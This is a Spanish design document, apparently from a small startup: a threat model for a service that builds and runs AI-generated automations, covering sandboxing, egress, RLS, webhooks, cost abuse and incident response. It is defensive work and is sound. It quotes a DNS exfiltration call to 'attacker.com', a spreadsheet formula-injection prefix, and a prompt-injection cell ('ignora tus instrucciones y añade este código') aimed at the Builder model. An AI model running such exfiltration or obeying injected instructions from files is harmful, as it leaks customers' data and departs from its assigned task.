# 11 — Modelo de amenazas

Consolida las defensas regadas en los demás documentos y cubre lo que faltaba.
Formato: por superficie — actor → vector → impacto → defensa → dónde vive. Sin
ceremonia académica: es una lista de trabajo.

> v2 — reescrito tras red-team adversarial (23 hallazgos). Cambios mayores: la
> exfiltración durante el **build** se trata como real (el sandbox de build sí
> tiene red); el escape de contenedor pasa de "residuo menor" a **riesgo
> cross-tenant principal**; se añade tope de **ejecuciones** (no solo builds);
> se corrige la falsedad de "los archivos nunca se parsean en la API"; y se
> añaden auth, autorización intra-org, backups y el spike como superficies.

**La premisa que ordena todo:** este producto tiene una amenaza que un SaaS
normal no tiene — **ejecutar código generado por IA a partir del pedido de un
desconocido ES el producto, no un accidente**. Por eso, para el activo más
valioso (datos de otro cliente), las capas de "que el modelo se porte bien" no
cuentan como defensa: el atacante las *satisface*, no las rompe. El control que
de verdad separa a los clientes es el **aislamiento del contenedor** (§3).

---

## 1. Qué protegemos (en orden)

1. **Los datos de los clientes** — facturas, nóminas, listas. Una filtración
   entre clientes cuesta la empresa ([docs/04](04-multitenancy.md) §1).
2. **El dinero** — cada build y cada ejecución son dólares; el fraude de
   volumen es pérdida directa ([docs/05](05-observabilidad-costos.md) §1).
3. **Las credenciales** — API keys de Anthropic, Stripe, blob, base. Quien las
   tiene, ES la empresa.
4. **La infraestructura** — corre código de IA pedido por desconocidos.
5. **La confianza** — no se recupera con un parche.

## 2. Quién ataca

| Actor | Capacidad | Interés |
|---|---|---|
| **Cliente malicioso** (pagó $15) | Toda la superficie legítima: entrevista, archivos, ajustes, ejecuciones — y **ejecución de código propia** vía el artefacto | Datos de otros; cómputo gratis; usar el runner como plataforma de escape |
| **Externo no autenticado** | Web, API, webhooks | Credenciales, IDOR, DoS, webhooks falsos |
| **Insider intra-org** (viewer/ex-empleado) | Rol limitado dentro de una org | Elevación: hacer lo que su rol prohíbe |
| **Cliente negligente** | Sube datos de terceros, archivos rotos | Nada — causa incidentes igual |
| **Cadena de suministro** | PyPI, imagen base, deps del front | Ejecución en tu infra o en los artefactos |
| **El propio agente** (falla, no malicia) | Todo lo que el Builder escribe | Código incorrecto o inseguro sin que nadie lo pida |
| **Fundador comprometido** (laptop/cuenta) | Todo | Todo — se trata con higiene y break-glass (§9) |

## 3. EL riesgo central: aislamiento cross-tenant

Se trata primero porque es el más grave y el más malentendido. La cadena
"intake → spec delimitado → Builder → Verifier" defiende contra **un artefacto
malicioso**, y [§8] ya concede que un spec malicioso bien formado puede pasar.
**Ejecutar código arbitrario es una función del producto**, así que el atacante
no necesita colar nada: pide una automatización de apariencia legítima cuyo
código, en la ejecución, intenta escapar del contenedor.

Para ese ataque, lo único que separa sus datos de los de otro cliente es:

1. **Un contenedor por ejecución, destruido siempre, sin red** ([docs/02](02-runtime.md) §6).
2. **Pertenencia org↔artefacto validada dentro del runner** ([docs/04](04-multitenancy.md) §6).
3. **El runtime del contenedor** — y aquí está la verdad incómoda.

**Decisión pendiente #1 (elevada por el red-team):** el MVP planeaba runtime
estándar endurecido (no-root, sin red, efímero) y dejaba gVisor/Firecracker
"para cuando el producto crezca" ([docs/02](02-runtime.md) §10). El red-team
argumenta —con razón— que como la ejecución de código arbitrario es el
producto, el escape de contenedor no es un residuo lejano: es el eslabón
portante del activo #1. **Recomendación revisada: adelantar el aislamiento
fuerte (gVisor es el más barato de operar) a antes del primer cliente de pago,
no a "cuando haya volumen".** El "sin red en el runner" ya corta la
exfiltración *después* de un escape exitoso, pero no el escape mismo. Ver §12.

Este documento deja de afirmar que "hay que romperlas todas": para el
cross-tenant, **las capas de inyección no aplican y el control portante es el
aislamiento**. Honestidad sobre optimismo.

## 4. Superficie: archivos subidos

El canal de entrada más gordo y menos estructurado. Reglas base en
[docs/10](10-intake.md) §4 (3 archivos, 10 MB, extensiones `csv xlsx xls pdf
txt`). Correcciones que el red-team obligó:

**Los archivos SÍ se parsean fuera del sandbox — y hay que blindarlo.** La
validación del manifiesto ([docs/01](01-artefacto.md) §5) corre en el backend
antes de arrancar el contenedor: abrir un xlsx es parsear un ZIP/XML completo.
Un cliente de $15 que sube una **zip-bomb / decompression-bomb** revienta la
memoria del tier web multi-tenant — un DoS real. (Mi v1 afirmaba lo contrario;
era falso y peligroso, porque implicaba no construir la mitigación.)

Defensa: el parseo de validación corre en un **worker aislado con RAM y CPU
acotadas** (no en el proceso web), en modo `read_only`, con **límite de ratio
de descompresión**, tope de celdas/filas y timeout. Si revienta, muere el
worker, no la API.

**Tipo real, no extensión.** Magic bytes en el upload; un `.csv` que es un
ejecutable renombrado se rechaza antes de tocar blob.

**Contenido como inyección — el canal que el intake NO filtra.** Una celda con
"ignora tus instrucciones y añade este código" la lee el Builder dentro del
sandbox de build. El filtro semántico del intake ([docs/10](10-intake.md) §5)
**no ve dentro de los archivos** — este payload lo saltea entero. Por eso la
contención del build no puede depender del modelo (ver §5).

**Parsear, nunca ejecutar.** `openpyxl` no corre VBA; los PDF se extraen como
texto. Regla estructural.

**Fórmula injection en las SALIDAS.** Un xlsx generado con celdas `=cmd|…`
ataca el Excel del *cliente*. Regla del Builder + verificación en la puerta de
calidad: texto que empieza con `= + - @` se neutraliza. Caso en la suite de
regresión.

## 5. Superficie: el código generado — build y run son distintos

**Distinción que el red-team obligó a explicitar:** el RUN no tiene red; el
BUILD sí (CMA necesita pip). Son dos niveles de contención distintos.

### En el RUN (contención fuerte)

| Vector | Defensa | Doc |
|---|---|---|
| Exfiltración | Sin red — canal cortado de raíz | 02 §6 |
| Cross-tenant | §3 (aislamiento de contenedor + pertenencia) | 02 §6, 04 §6 |
| Bombas de recursos | 512 MB, 1 CPU, 300 s, 64 procesos, /out 100 MB | 02 §6 |
| Persistencia | Contenedor efímero, raíz de solo lectura | 02 §6 |
| Fórmula en salidas | Neutralización + regresión | §4 |

### En el BUILD (contención más débil — tiene red)

El Builder ejecuta el código que genera contra el archivo **real** del cliente,
y el sandbox tiene salida a internet para instalar paquetes. Esto es un canal
de exfiltración que mi v1 pasó por alto:

| Vector | Defensa |
|---|---|
| Exfiltración por DNS (`socket.gethostbyname('DATOS.attacker.com')`) — funciona aunque el TCP a hosts arbitrarios esté bloqueado, porque pip necesita resolver nombres | **Egress del build restringido a un mirror privado de PyPI** (solo paquetes de la lista blanca), con **DNS fijado** a ese mirror — sin resolución arbitraria. No basta "sin hosts arbitrarios": hay que matar el DNS libre. |
| `pip install paquete-malo` cuyo `setup.py` corre código arbitrario CON red durante el build | La lista blanca se aplica **dentro** del sandbox de build (el mirror solo sirve lo aprobado), no solo en la puerta de calidad sobre el `requirements.txt` final |
| Payload dentro del archivo de ejemplo (§4) | El Verifier de contexto fresco atrapa la *desviación de resultado*, pero NO es contención — la contención es el egress restringido de arriba |

**Decisión pendiente #2:** hay que confirmar con la doc de CMA qué permite
exactamente el modo `limited` de networking (¿DNS a nombres fuera del registro?
¿solo el índice de paquetes?). Si CMA no permite fijar un mirror privado con
DNS restringido, esto obliga a mover el build a un runner propio antes de lo
planeado — o aceptar el riesgo de exfiltración durante el build de forma
explícita. Ver §12.

**Supply chain de la caché de dependencias.** Las capas cacheadas por hash de
`requirements.txt` se comparten entre tenants ([docs/01](01-artefacto.md) §4).
Regla: se construyen **solo desde paquetes pinneados de la lista blanca, por un
builder de confianza, direccionadas por contenido e inmutables**; ningún
sandbox de build o run puede escribirlas. Un caso del checklist lo verifica.

## 6. Superficie: la plataforma web

| Vector | Defensa | Doc |
|---|---|---|
| **Toma de cuenta (spoofing)** | Delegado a Clerk. **MFA obligatoria para owner y facturación** (no solo "disponible"). Diseño de sesiones/recuperación/revocación: **pendiente, docs/13** | 13 (pendiente) |
| **Elevación intra-org** | Roles owner/member/viewer ([docs/04](04-multitenancy.md) §3) verificados en la capa de aplicación en CADA acción con efecto (RLS filtra por `org_id`, NO por rol — un viewer podría disparar un build si no se comprueba). Revocación de membresía de ex-empleados | 04 §3 + §10 |
| **IDOR cross-org** | RLS en Postgres — con la corrección de abajo | 04 §2 |
| Archivos ajenos por URL | URLs firmadas de 5 min + verificación de pertenencia | 04 §2 |
| **XSS/inyección vía strings generados** | React auto-escapa en la UI. El riesgo real está en el **correo HTML y su asunto** (Resend): `nombre_generado` (Haiku), `saludo`, y nombres de columna reflejados en errores son **no confiables** y se escapan/normalizan antes de interpolar. La afirmación "las vistas no generan HTML ejecutable" ([docs/09](09-sistema-de-componentes.md) §1) aplica **solo al catálogo de vistas**, no a estos strings | 09 §1 + aquí |
| Pagos | Stripe aloja las tarjetas; **webhooks de Stripe verificados por firma** (§7); sin datos de pago en nuestra base | 13 (pendiente) |
| Fuerza bruta / DoS básico | Rate limiting por IP y por org; Vercel/WAF delante | aquí |
| CSRF / cabeceras / cookies | Estándar Next+Clerk, **verificado en §10** (CSP, HSTS, cookies Secure/HttpOnly/SameSite) | §10 |

**Corrección crítica de RLS.** RLS de Postgres **no aplica al rol dueño de la
tabla** ni a roles con `BYPASSRLS`, y las cadenas de conexión por defecto de
Neon/Supabase conectan **como dueño** — con lo que las policies quedan
silenciosamente inertes y la filtración cross-tenant regresa. Requisito: un
**rol de aplicación dedicado, no-dueño, sin BYPASSRLS**, y `FORCE ROW LEVEL
SECURITY` en toda tabla con `org_id`. El test del checklist corre **como ese
rol real**, no solo verifica que la policy exista. ([docs/04](04-multitenancy.md)
§2, ya anotado.)

## 7. Superficie: el pipeline de build

| Vector | Defensa | Doc |
|---|---|---|
| **Webhooks falsificados** (CMA "avisa" que un build terminó; Stripe "avisa" un pago) | **Verificación de firma HMAC ANTES del dedupe**: firma inválida → 401 y descarte. CMA usa `whsec` ([docs/07](07-entornos-despliegue.md) §5); Stripe su propia firma. Diseño del paso de verificación: **pendiente, docs/13** — hoy solo existe el dedupe por `event.id` ([docs/03](03-pipeline-build.md) §3) | 13 (pendiente) |
| Doble-encolado (outbox + dispatcher + reconciliación pueden crear 2 jobs del mismo build) | **Idempotencia por `(automation_id, version_id)`** a nivel de job — dispatcher y barrido no pueden duplicar | 03 §3, 10 §9 |
| Red del sandbox de build | Mirror privado + DNS fijado (§5) | §5 |
| Datos del cliente en trazas de CMA | Retención 90 días; el borrado incluye `sessions.delete()` en Anthropic | 04 §4 |
| API key de Anthropic | Solo servidor, por entorno, jamás en cliente ni contenedor de run; rotación documentada (§11) | 07 §5 |
| Gasto desbocado en build | `task_budget` + tope de iteraciones + corte a $10/build + contador acumulado + alarmas | 03 §5, 05 §4 |

## 8. Superficie: abuso económico

Separada porque el red-team encontró un agujero que ninguna otra sección cubría.

| Vector | Defensa |
|---|---|
| Builds en bucle (crear/borrar/ajustar) | Tope interno **2× espacios/mes** por org ([docs/10](10-intake.md) §8); corte a $10/build |
| **Ejecuciones ilimitadas** — el agujero grande | Con el Run en CMA (~$0.30/ejecución, [docs/02](02-runtime.md) §2), una cuenta de $15 con una automatización puede ejecutar miles de veces. La idempotencia solo frena el doble-clic; con entradas distintas cada run cuesta. La alarma de [docs/05](05-observabilidad-costos.md) §4 **avisa pero no corta**. **Falta un tope duro de ejecuciones que CORTE.** Ver decisión #3 |
| Entrevistas en bucle | 10 intakes/org/día + presupuesto de llamadas por intake ([docs/10](10-intake.md) §8) |
| Sondeo del clasificador (`no_procede` repetido) | Alerta por org con muchos `no_procede` en poco tiempo + registro mínimo con control de acceso para forense (§9) |

**Decisión pendiente #3:** definir una **cuota de ejecuciones por plan que
corte**, no solo alarme — crítica mientras el Run viva en CMA. "Sin límite" en
[docs/06](06-pricing.md) era viable *solo* con el runner propio barato (Fase 2);
con CMA hay que poner un techo duro. Ver §12.

## 9. Riesgos aceptados e higiene operacional

### Riesgos aceptados (decisiones, no descuidos)

| Riesgo | Por qué se acepta | Revisar cuando |
|---|---|---|
| Sin antivirus/escaneo de archivos | Se parsean acotados (§4), nunca se ejecutan | Cliente enterprise lo exija |
| Ejemplo del cliente sin anonimizar | Decisión de producto declarada | Cliente sensible lo pida (04 §4) |
| DDoS sofisticado | Vercel + rate limiting básico | Primer incidente real |
| APT / estado-nación | Fuera de alcance de un MVP | Nunca realista a este tamaño |

**Ya NO aceptado** (movido por el red-team): el runtime de contenedor estándar
para el cross-tenant (§3, decisión #1) y la exfiltración durante el build (§5,
decisión #2) dejan de ser residuos y pasan a decisiones activas de §12.

### Higiene operacional (el atacante más barato entra por aquí)

- **MFA en TODO**: GitHub, Vercel, Stripe, Anthropic, Neon, Resend, correo.
- **Laptop del fundador** (el "atacante más barato" para un equipo de 1):
  cifrado de disco + bloqueo de pantalla obligatorios; secretos nunca en claro
  en disco; capacidad de **revocar todas las sesiones a distancia** en cada
  plataforma; **códigos break-glass de recuperación custodiados FUERA de la
  laptop** (por si el fundador único pierde acceso).
- **Secretos** solo en los vaults de cada plataforma; jamás en repo ni `.env`
  compartidos por chat. **Escaneo de secretos en CI** (gitleaks/trufflehog)
  que **bloquea el push** — reemplaza la frágil "revisión manual antes de cada
  push".
- **El repo público** debe volverse privado **antes** de que cualquier API key
  o dato real lo toque (el spike, §abajo).
- Audit log append-only desde el día uno ([docs/04](04-multitenancy.md) §5).
- Backups: automáticos + **una restauración de prueba** antes del lanzamiento;
  **cifrados y con control de acceso** (contienen nóminas de todos los
  tenants); la ventana de retención se declara en la política de borrado y toda
  restauración **re-aplica los borrados pendientes** (una restauración no debe
  resucitar datos que un cliente pidió borrar).
- Dependencias del front/worker: Dependabot + `pnpm audit` en CI.

**El spike es una superficie.** `spike/` usa la API key **real** de Anthropic y
CSVs reales; el repo es público. Antes de correrlo: repo privado (o secretos y
fixtures en ubicación separada), **datos sintéticos** en los fixtures, y el
escaneo de secretos de CI activo.

## 10. Checklist pre-lanzamiento

Cada línea es verificable; ninguna es opcional:

- [ ] Aislamiento cross-tenant: A intenta leer automatización/archivo/run de B
      por API directa → 404/403 en todos
- [ ] **RLS con el rol de app real** (no dueño, sin BYPASSRLS, `FORCE`): query
      cross-org devuelve 0 filas corriendo COMO ese rol
- [ ] **Elevación intra-org**: viewer intenta crear/modificar/disparar build →
      403; member intenta tocar facturación/borrar org → 403; membresía de
      ex-empleado revocada corta el acceso
- [ ] **Escape de contenedor**: exploit conocido de runtime en el runner →
      contenido (decisión #1 define el runtime)
- [ ] **Egress del build**: callback DNS/HTTP desde el sandbox de build →
      bloqueado y alertado
- [ ] Magic bytes en upload + rechazo de tipo disfrazado
- [ ] **Decompression-bomb xlsx** en el endpoint de subida → rechazo por
      límites, sin tumbar la API
- [ ] Fórmulas neutralizadas en salidas xlsx/csv (caso en la suite de regresión)
- [ ] Fork-bomb y archivo de 100 MB contra el runner → mueren por límites
- [ ] Caché de dependencias no es escribible por el sandbox
- [ ] **Firma de webhooks** (CMA y Stripe): petición sin firma → 401 antes del dedupe
- [ ] **Kill-switch global**: al activarlo en staging, bloquea de verdad builds
      y ejecuciones; existe una palanca separada que corta cobros de Stripe
- [ ] Inyección de prueba del intake (docs/10 §11) filtrada
- [ ] Correo HTML: `nombre_generado`/`saludo`/columnas reflejadas escapados;
      sin inyección de cabecera en el asunto
- [ ] Tope de gasto por build corta de verdad (build saboteado en staging)
- [ ] **Tope de ejecuciones por plan corta** (decisión #3)
- [ ] Restauración de backup ejecutada una vez; re-aplica borrados pendientes
- [ ] Rate limiting → 429 (test con ráfaga)
- [ ] CSRF activo en endpoints con efecto; cabeceras (CSP, HSTS,
      X-Content-Type-Options, X-Frame-Options); cookies Secure/HttpOnly/SameSite
- [ ] `security.txt` + correo de seguridad publicado
- [ ] Privacidad y ToS: retención (incluidos leads y backups), reporte de
      abuso, uso de IA

## 11. Respuesta a incidentes (equipo de una persona)

**Incidente grave:** datos de un cliente visibles para otro · credencial de
plataforma filtrada · código ejecutándose fuera del sandbox · cargo no
autorizado a clientes.

1. **Congelar** — kill-switch global que pausa builds y ejecuciones (construido
   y probado, §10). Para un incidente de **facturación**, la palanca es separada:
   pausar cobros en Stripe.
2. **Rotar** la credencial afectada (todas si no está claro cuál) siguiendo el
   **runbook de rotación por plataforma** — orden y dependencias documentados
   en [docs/07](07-entornos-despliegue.md) §5 (nueva antes de revocar la vieja):
   Anthropic, `whsec`, Neon, R2/S3, Stripe.
3. **Medir** — audit log + trazas → qué org, qué datos, qué ventana.
4. **Avisar** a los afectados con honestidad y plazo (la ley de datos mexicana
   y el sentido común coinciden: pronto y claro).
5. **Post-mortem** en el repo: qué capa falló, qué defensa nueva entra al §10.

## 12. Decisiones pendientes (elevadas por el red-team)

Tres necesitan decisión de negocio, no de ingeniería:

1. **¿Aislamiento fuerte (gVisor/Firecracker) antes del primer cliente?** El
   red-team argumenta que sí, porque ejecutar código arbitrario es el producto
   y el escape es el riesgo cross-tenant portante. Costo: más complejidad de
   runner en el MVP. Alternativa: lanzar con runtime endurecido + auditoría
   externa y adelantar gVisor apenas haya un cliente que maneje datos sensibles.
2. **¿El build puede vivir en CMA con egress seguro?** Depende de si CMA
   permite mirror privado + DNS fijado. Si no, el build migra a runner propio
   antes de lo planeado, o se acepta la exfiltración-durante-build por escrito.
3. **¿Cuota de ejecuciones por plan?** Obligatoria mientras el Run viva en CMA.
   Sugerencia inicial: Base 500/mes, Pro 2,000, Equipo 10,000 — que corte con
   opción de subir de plan. Se afina con datos reales de uso.

---

## Relación con el resto de la arquitectura

Este documento **verifica que las capas ya diseñadas formen cadenas sin
eslabones sueltos, y nombra dónde la cadena NO está en serie**. Para la mayoría
de los activos las capas se acumulan; para el cross-tenant (§3) no, y ahí el
control portante es el aislamiento del contenedor — por eso es la decisión #1.
Las superficies que este doc descubrió sin dueño (auth, webhooks-firma) se
diseñan en docs/13; las correcciones baratas (RLS forzado, leads al inventario
de borrado, parseo acotado) ya se anotaron en sus documentos.
